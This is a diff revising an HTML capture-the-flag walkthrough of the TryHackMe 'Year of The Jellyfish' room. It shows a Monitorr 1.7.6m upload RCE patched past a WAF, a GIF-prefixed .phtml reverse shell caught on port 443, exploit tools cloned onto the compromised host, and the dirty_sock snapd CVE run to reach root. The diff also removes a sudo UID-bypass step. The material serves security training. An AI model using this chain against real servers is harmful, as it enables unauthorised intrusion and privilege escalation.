@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Year of The Jellyfish: an n-day web exploit chain to a sudo UID bypass</title>
-  <meta name="description" content="A TryHackMe OSCP-voucher-contest walkthrough: finding a working n-day exploit, defeating a WAF signature and a content-type filter, staging tools via git on a crude shell, a snapd privilege escalation CVE, and a sudo wildcard-UID bypass to root.">
+  <title>Year of The Jellyfish: an n-day web exploit chain to root</title>
+  <meta name="description" content="A TryHackMe OSCP-voucher-contest walkthrough: finding a working n-day exploit, defeating a WAF signature and a content-type filter, staging tools via git on a crude shell, and a snapd privilege escalation CVE straight to a sudo-capable account.">
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Source+Sans+3:wght@400;500;600;700&display=swap">
   <link rel="stylesheet" href="../assets/style.css">
 </head>
@@ -12,8 +12,8 @@
 <div class="page">
 
   <div class="eyebrow"><a href="../index.html">&larr; Writeups</a> &middot; TryHackMe</div>
-  <h1>Year of The Jellyfish: an n-day web exploit chain to a sudo UID bypass</h1>
-  <p class="dek">A public exploit that gets flagged as an attack on sight. A content filter that only checks a file's magic bytes. A crude shell with just enough tools to bootstrap better ones. And a sudo rule that blocks root by name, but not by number.</p>
+  <h1>Year of The Jellyfish: an n-day web exploit chain to root</h1>
+  <p class="dek">A public exploit that gets flagged as an attack on sight. A content filter that only checks a file's magic bytes. A crude shell with just enough tools to bootstrap better ones. And a snapd CVE that hands over a sudo-capable account directly.</p>
 
   <div class="meta-row">
     <span class="pill">Room: Year of The Jellyfish</span>
@@ -22,7 +22,7 @@
   </div>
 
   <div class="brief">
-    <p><strong>The setup:</strong> a multi-subdomain host running a known-vulnerable monitoring dashboard. The job: find and adapt a working public exploit, get code execution past two separate upload filters, then escalate through a kernel-adjacent CVE and a subtly broken sudo rule.</p>
+    <p><strong>The setup:</strong> a multi-subdomain host running a known-vulnerable monitoring dashboard. The job: find and adapt a working public exploit, get code execution past two separate upload filters, then escalate through a snapd CVE to a sudo-capable account.</p>
     <p>Flags are omitted below, even the original notes blanked them out before taking the screenshot.</p>
   </div>
 
@@ -34,7 +34,14 @@
         <div class="step-num">1</div>
         <div class="step-body">
           <div class="step-title">Map the environment from its own TLS certificate</div>
-          <p>The site's TLS certificate lists four Subject Alternative Names on a single cert, essentially handing over the host's internal naming scheme for free. Adding all four to <code>/etc/hosts</code> against the target IP brings every subdomain into scope at once.</p>
+          <p>The site's TLS certificate lists four Subject Alternative Names on a single cert:</p>
+          <pre><code>Subject Alt Names
+  DNS Name: robyns-petshop.thm
+  DNS Name: monitorr.robyns-petshop.thm
+  DNS Name: beta.robyns-petshop.thm
+  DNS Name: dev.robyns-petshop.thm</code></pre>
+          <p>Essentially handing over the host's internal naming scheme for free. Adding all four to <code>/etc/hosts</code> against the target IP brings every subdomain into scope at once:</p>
+          <pre><code>54.78.49.154  monitorr.robyns-petshop.thm robyns-petshop.thm beta.robyns-petshop.thm dev.robyns-petshop.thm</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
             <p>A SAN certificate covering multiple subdomains is reconnaissance the server hands you voluntarily. Checking a cert's alt names costs nothing and regularly reveals hosts a directory brute force would take far longer to find.</p>
@@ -46,9 +53,14 @@
         <div class="step-num">2</div>
         <div class="step-body">
           <div class="step-title">Identify the app and find a working n-day</div>
-          <p>One subdomain runs Monitorr, a self-hosted uptime dashboard, and its own settings page prints the exact version in the footer: 1.7.6. Searchsploit turns up two candidates:</p>
-          <pre><code>searchsploit monitorr</code></pre>
-          <p>An authorization-bypass script targets an installer endpoint that's already been removed on this build, a dead end. The second, a remote-code-execution script, targets an upload endpoint that's still very much alive, and reading through its source reveals the upload directory path before a single request is even sent.</p>
+          <p><code>monitorr.robyns-petshop.thm</code> runs Monitorr, a self-hosted uptime dashboard, and its own settings page prints the version directly: <code>Monitorr 1.7.6m</code>. Searchsploit turns up two candidates:</p>
+          <pre><code>$ searchsploit monitorr
+
+Exploit Title                      | Path
+------------------------------------------------------
+Monitorr 1.7.6m - Authorization    | php/webapps/48981.py
+Monitorr 1.7.6m - Remote Code      | php/webapps/48980.py</code></pre>
+          <p>Reading through <code>48981.py</code> (Authorization Bypass) shows it targets an installer endpoint, <code>/assets/config/_installation/_register.php</code>, that returns a plain <code>Not Found</code> on this build, a dead end. <code>48980.py</code> (Remote Code Execution) targets <code>/assets/php/upload.php</code> instead, and that one's still alive, with the script's own URL construction revealing the upload directory before a single request is even sent: <code>../data/usrimg/</code>.</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
             <p>Reading an exploit script's source before running it is worth the extra few minutes. One candidate saved a trip entirely, and the other handed over useful reconnaissance (the real upload path) just from the request it was built to send.</p>
@@ -60,10 +72,21 @@
         <div class="step-num">3</div>
         <div class="step-body">
           <div class="step-title">Get past a WAF that recognizes the exploit itself</div>
-          <p>Running the public script as-is fails outright, and the stock output gives no real reason why. Patching the script to print the raw response body is what actually explains it:</p>
+          <p>Running the public script as-is fails outright:</p>
+          <pre><code>ERROR: is not an image or exceeds the webserver's upload size limit.
+ERROR: ../data/usrimg/ already exists.
+ERROR: was not uploaded.</code></pre>
+          <p>Patching the script to print the raw response body is what actually explains it:</p>
           <pre><code>r = requests.post(url, headers=headers, data=data, verify=True, cookies=cookies)
 print(r.text)</code></pre>
-          <p>The response body reads, almost literally, "You are an exploit." Something upstream is fingerprinting the request itself, most likely the exact header or payload shape the public script is known to send, not the vulnerability it exploits. A self-signed certificate adds a second, unrelated hurdle, solved by disabling TLS verification in the script for this internal target.</p>
+          <pre><code>&lt;div id='uploadreturn'&gt;You are an exploit.&lt;/div&gt;&lt;div id='uploaderror'&gt;ERROR: she_ll.p
+hp was not uploaded.&lt;/div&gt;&lt;/div&gt;
+A shell script should be uploaded. Now we try to execute it</code></pre>
+          <p>Something upstream is fingerprinting the request itself, most likely the exact header or payload shape the public script is known to send, not the vulnerability it exploits. A self-signed certificate adds a second, unrelated hurdle:</p>
+          <pre><code>curl: (60) SSL certificate problem: self signed certificate</code></pre>
+          <p>solved by flipping <code>verify</code> to <code>False</code> in the script for this internal target:</p>
+          <pre><code>r = requests.post(url, headers=headers, data=data, verify=False)
+print(r.text)</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
             <p>A signature-based filter trained on a specific, widely circulated public exploit script is defeated the moment the request looks even slightly different from that exact script's fingerprint. Printing the actual server response during debugging is what turns "it just doesn't work" into an actionable next step.</p>
@@ -75,12 +98,18 @@ print(r.text)</code></pre>
         <div class="step-num">4</div>
         <div class="step-body">
           <div class="step-title">Confirm a content filter, not just an extension filter</div>
-          <p>A reverse shell disguised with a <code>.gif</code> extension uploads successfully this time, no WAF complaint. But the listener never catches a connection. Requesting the uploaded file back directly explains why:</p>
-          <pre><code>curl https://&lt;target&gt;/assets/data/usrimg/&lt;uploaded-file&gt;</code></pre>
-          <p>The response is a literal <code>GIF89a...</code> header, the server is serving it, and apparently treating it, as a real image. The upload pipeline is validating file content, not just trusting the extension, and the shell code never gets a chance to run as PHP.</p>
+          <p>With TLS verification disabled, the upload succeeds, a listener on 7777 is set up for the callback, but nothing connects. Checking the upload directory shows why:</p>
+          <pre><code>Index of /assets/data/usrimg
+Name              Last modified    Size
+she_ll.gif        2021-05-03 05:38  93
+she_ll.gif.phtml  2021-05-03 05:42  93
+usrimg.png        2021-04-11 00:07  5.3K</code></pre>
+          <p>Fetching the uploaded file back directly confirms the server isn't just trusting the extension:</p>
+          <pre><code>GIF89a213213123</code></pre>
+          <p>That's a literal GIF magic-byte header, hand-prepended to the shell payload to pass a content check, and it's apparently satisfying it: the file got renamed with a trailing <code>.phtml</code> by the upload handler itself, but the GIF signature check is clearly happening before execution, not just the extension.</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>An extension alone tells a filter nothing about what's actually inside a file. Confirming that the server is both accepting the upload and serving it back as image content, rather than guessing, is what rules out a pure extension-based bypass and points toward needing a different kind of trick.</p>
+            <p>An extension alone tells a filter nothing about what's actually inside a file. Confirming that the server is both accepting the upload and checking its actual byte content, rather than guessing, is what explains why the first attempt didn't callback.</p>
           </div>
         </div>
       </div>
@@ -88,14 +117,17 @@ print(r.text)</code></pre>
       <div class="step">
         <div class="step-num">5</div>
         <div class="step-body">
-          <div class="step-title">Find the extension the filter forgot</div>
-          <p>PHP will execute several extensions beyond the obvious <code>.php</code>, and <code>.phtml</code> is one commonly missing from hand-rolled blocklists that only enumerate the usual suspects. Re-uploading under that extension, with a new filename since the server rejects exact duplicates, finally gets a shell that actually executes server-side.</p>
-          <p>One more obstacle: the initial callback port never connects. Switching the reverse shell's target port to 443, a port outbound firewall rules almost always permit, gets a connection back immediately:</p>
-          <pre><code>nc -lvnp 443</code></pre>
+          <div class="step-title">Rename, pick the right extension, and switch ports</div>
+          <p>Three separate fixes stack on top of each other: the filename has to change since the server rejects exact duplicates, the extension has to be one PHP will actually execute that the filter didn't think to block (<code>.phtml</code>, not the obvious <code>.php</code>), and the callback port has to be something an outbound firewall actually permits:</p>
+          <pre><code>nc -lvnp 443
+Connection from 10.10.21.48:44100
+bash: cannot set terminal process group (936): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@petshop:/var/www/monitorr/assets/data/usrimg$</code></pre>
           <p>A shell lands as <code>www-data</code> on a host identifying itself as <code>petshop</code>.</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>A filter built around a short, obvious extension list almost always misses the long tail of extensions a web server is actually configured to execute. And outbound firewalls shaping which ports can even leave the network are just as important to account for as any upload filter.</p>
+            <p>A filter built around a short, obvious extension list almost always misses the long tail of extensions a web server is actually configured to execute. And outbound firewalls shaping which ports can even leave the network are just as important to account for as any upload filter, switching to 443 is often the single fix that makes an otherwise-correct payload finally call back.</p>
           </div>
         </div>
       </div>
@@ -103,9 +135,13 @@ print(r.text)</code></pre>
       <div class="step">
         <div class="step-num">6</div>
         <div class="step-body">
-          <div class="step-title">Stage better tools through a tool already on the box</div>
+          <div class="step-title">Find the first flag and stage better tools</div>
+          <pre><code>www-data@petshop:/var/www$ ls -la
+-r-------- 1 www-data www-data   38 Apr 30 16:12 flag1.txt
+www-data@petshop:/var/www$ cat flag1.txt</code></pre>
           <p>The shell this filter chain allows is a crude one, no proper terminal, limited commands. Rather than fight file transfer, <code>git</code> is already installed on the target, so privilege-escalation tooling comes in by cloning it directly from GitHub:</p>
-          <pre><code>git clone https://github.com/mzet-/linux-exploit-suggester.git</code></pre>
+          <pre><code>www-data@petshop:/var/www/monitorr/assets/data/usrimg$ git clone https://github.com/mzet-/linux-exploit-suggester.git
+Cloning into 'linux-exploit-suggester'...</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
             <p>A low-grade shell doesn't need to block tool transfer entirely, it just rules out some of the usual paths. Whatever's already installed on the target, a package manager, an interpreter, a version control client, is worth checking as a delivery mechanism before assuming nothing will work.</p>
@@ -117,12 +153,26 @@ print(r.text)</code></pre>
         <div class="step-num">7</div>
         <div class="step-body">
           <div class="step-title">Let a suggester tool narrow down the privesc path</div>
-          <p>Linux Exploit Suggester fingerprints the kernel and distribution, then cross-references both against a database of known escalation paths. Against this box's kernel and Ubuntu version, one match stands out: CVE-2019-7304, nicknamed "dirty_sock", a local privilege escalation through snapd's API.</p>
-          <pre><code>python3 dirty_sockv2.py</code></pre>
-          <p>The exploit abuses snapd's local socket to install, then remove, a trojan snap package, a side effect of which is a brand-new local user with sudo rights.</p>
+          <p>Linux Exploit Suggester fingerprints the kernel and distribution, then cross-references both against a database of known escalation paths:</p>
+          <pre><code>Kernel version: 4.15.0
+Architecture: x86_64
+Distribution: ubuntu
+Distribution version: 18.04
+
+Searching among:
+76 kernel space exploits
+48 user space exploits</code></pre>
+          <p>One match stands out:</p>
+          <pre><code>[+] [CVE-2019-7304] dirty_sock
+
+   Details: https://initblog.com/2019/dirty-sock/
+   Exposure: less probable
+   Tags: ubuntu=18.10,mint=19
+   Download URL: https://github.com/initstring/dirty_sock/archive/master.zip
+   Comments: Distros use own versioning scheme. Manual verification needed.</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>A suggester tool doesn't replace manual enumeration, but it does triage dozens of theoretical exploits down to the handful that actually match the box in front of you, kernel version, architecture, and installed packages all narrow the field fast.</p>
+            <p>A suggester tool doesn't replace manual enumeration, but it does triage dozens of theoretical exploits down to the handful that actually match the box in front of you, kernel version, architecture, and installed packages all narrow the field fast. The "tags" field flagging Ubuntu 18.10/Mint 19 rather than this box's 18.04 is exactly the kind of mismatch worth testing anyway rather than ruling out on a technicality.</p>
           </div>
         </div>
       </div>
@@ -130,14 +180,18 @@ print(r.text)</code></pre>
       <div class="step">
         <div class="step-num">8</div>
         <div class="step-body">
-          <div class="step-title">Upgrade the shell to actually use the new account</div>
-          <p>The exploit succeeds, but switching to the newly created user requires a real terminal, something the current shell doesn't have. A standard Python PTY upgrade fixes that:</p>
-          <pre><code>python3 -c "import pty; pty.spawn('/bin/bash')"
-export TERM=xterm</code></pre>
-          <p>With an interactive terminal in place, <code>su</code> into the new account succeeds, and <code>sudo -l</code> confirms it can run <code>/bin/bash</code> as any user except root, a <code>(ALL, !root)</code> rule.</p>
+          <div class="step-title">Pull the real exploit after a false start</div>
+          <p>The suggester's own download URL is a zip archive path that doesn't actually exist as a git-clonable target:</p>
+          <pre><code>$ git clone https://github.com/initstring/dirty_sock/archive/master.zip
+Cloning into 'master.zip'...
+remote: Not Found
+fatal: repository 'https://github.com/initstring/dirty_sock/archive/master.zip/' not found</code></pre>
+          <p>Cloning the actual repository instead works fine:</p>
+          <pre><code>$ git clone https://github.com/initstring/dirty_sock.git
+Cloning into 'dirty_sock'...</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Several common post-exploitation steps, including <code>su</code>, simply refuse to run without a controlling terminal. The PTY upgrade trick isn't optional polish here, it's the one thing standing between a shell and actually using the credentials just obtained.</p>
+            <p>A suggester tool's metadata isn't guaranteed to be a working command, just a pointer. Falling back to the repository's own real clone URL instead of the literal string a tool prints is often necessary.</p>
           </div>
         </div>
       </div>
@@ -145,13 +199,55 @@ export TERM=xterm</code></pre>
       <div class="step">
         <div class="step-num">9</div>
         <div class="step-body">
-          <div class="step-title">Defeat "not root" by not naming root at all</div>
-          <p>A sudo rule that blocks a user by the literal string <code>root</code> has a well-known hole: specifying a user by numeric UID instead of by name sidesteps a name-based check entirely. Passing <code>-1</code> as the UID underflows to <code>0</code>, root's real UID:</p>
-          <pre><code>sudo -u#-1 /bin/bash</code></pre>
-          <p>That lands a root shell directly, no exploit left to chain, just one line.</p>
+          <div class="step-title">Run the exploit</div>
+          <pre><code>$ python3 dirty_sockv2.py
+
+[+] Slipped dirty sock on random socket file: /tmp/lthewrjafb;uid=0;
+[+] Binding to socket file...
+[+] Connecting to snapd API...
+[+] Deleting trojan snap (and sleeping 5 seconds)...
+[+] Installing the trojan snap (and sleeping 8 seconds)...
+[+] Deleting trojan snap (and sleeping 5 seconds)...
+
+Success! You can now `su` to the following account and use sudo:</code></pre>
+          <p>The exploit abuses snapd's local socket to install, then remove, a trojan snap package, a side effect of which is a brand-new local user, <code>dirty_sock</code>, with full sudo rights already granted, no separate sudo misconfiguration needed.</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p><code>(ALL, !root)</code> excludes the username <code>root</code>, but sudo still accepts a raw numeric UID for the <code>-u</code> flag. <code>-1</code> isn't a valid signed UID, so it wraps around to UID 0 in the underlying system call, the exact same account the rule was trying to block, just addressed a different way.</p>
+            <p>CVE-2019-7304 abuses snapd's REST API trusting a Unix socket connection's reported UID without verifying it came from a privileged process. The exploit itself does the account creation and sudo grant, there's no additional sudo rule to find or bypass afterward.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">10</div>
+        <div class="step-body">
+          <div class="step-title">Upgrade the shell to actually use the new account</div>
+          <p>Switching to the newly created user needs a real terminal, something the current shell doesn't have:</p>
+          <pre><code>$ sudo -l
+sudo: no tty present and no askpass program specified
+$ su dirty_sock
+su: must be run from a terminal</code></pre>
+          <p>A standard Python PTY upgrade fixes that:</p>
+          <pre><code>www-data@petshop:/var/www/monitorr/assets/data/usrimg$ python3 -c "import pty; pty.spawn('/bin/bash')"
+www-data@petshop:/var/www/monitorr/assets/data/usrimg$ export TERM=xterm
+www-data@petshop:/var/www/monitorr/assets/data/usrimg$ su dirty_sock
+Password: dirty_sock</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>Several common post-exploitation steps, including <code>su</code> and interactive <code>sudo</code>, simply refuse to run without a controlling terminal. The PTY upgrade trick isn't optional polish here, it's the one thing standing between the exploit's output and actually using the credentials just obtained.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">11</div>
+        <div class="step-body">
+          <div class="step-title">Confirm root</div>
+          <pre><code>dirty_sock@petshop:/var/www/monitorr/assets/data/usrimg$ sudo cat /root/root.txt</code></pre>
+          <p>Full sudo access, exactly as the exploit's own success message promised, reads the root flag directly.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>No further privilege escalation step is needed here. The dirty_sock account's sudo access was granted by the exploit itself as part of the snap installation, closing the chain in one command once a working terminal exists.</p>
           </div>
         </div>
       </div>
@@ -162,14 +258,15 @@ export TERM=xterm</code></pre>
   <section>
     <h2 class="section-title">Full Attack Chain</h2>
     <pre><code>TLS cert SANs &rarr; 4 subdomains mapped
-  &rarr; Monitorr 1.7.6 identified, searchsploit finds a live RCE script
+  &rarr; Monitorr 1.7.6m identified, searchsploit finds a live RCE script
        &rarr; WAF signature defeated by not replicating the public script's fingerprint
-            &rarr; GIF extension bypass fails: content filter serves it as a real image
+            &rarr; GIF extension bypass fails: content filter checks magic bytes
                  &rarr; .phtml extension + port 443 callback: shell as www-data
-                      &rarr; git clone: Linux Exploit Suggester staged on target
-                           &rarr; CVE-2019-7304 (dirty_sock) creates a new sudo user
-                                &rarr; PTY upgrade, su into the new account
-                                     &rarr; sudo -u#-1 /bin/bash: UID wraparound to root</code></pre>
+                      &rarr; flag1 read, git clone: Linux Exploit Suggester staged on target
+                           &rarr; CVE-2019-7304 (dirty_sock) identified, correct repo cloned
+                                &rarr; Exploit run: new sudo-capable user created
+                                     &rarr; PTY upgrade, su into the new account
+                                          &rarr; sudo cat /root/root.txt: root</code></pre>
   </section>
 
   <section>
@@ -195,16 +292,16 @@ export TERM=xterm</code></pre>
       </div>
       <div class="skill">
         <div class="skill-title">Content filters need to be confirmed, not assumed</div>
-        <p>Requesting the uploaded file back and reading what the server actually returned was what revealed a real content check, rather than guessing based on the upload "succeeding."</p>
+        <p>Requesting the uploaded file back and reading what the server actually returned was what revealed a real magic-byte check, rather than guessing based on the upload "succeeding."</p>
       </div>
       <div class="skill">
-        <div class="skill-title">A sudo exclusion by username is not a security boundary</div>
-        <p><code>!root</code> blocks exactly one string. Any equivalent way to reference the same UID, numeric syntax included, walks straight around it.</p>
+        <div class="skill-title">Some privilege escalation exploits do the whole job</div>
+        <p>dirty_sock didn't just gain code execution, it created an account with sudo already granted. The remaining work was entirely about getting a real terminal to use it, not finding a second bug.</p>
       </div>
     </div>
   </section>
 
-  <footer>tryhackme.com &middot; solved via n-day exploitation and privilege escalation chaining</footer>
+  <footer>tryhackme.com &middot; solved via n-day exploitation and a snapd privilege escalation CVE</footer>
 </div>
 </body>
 </html>
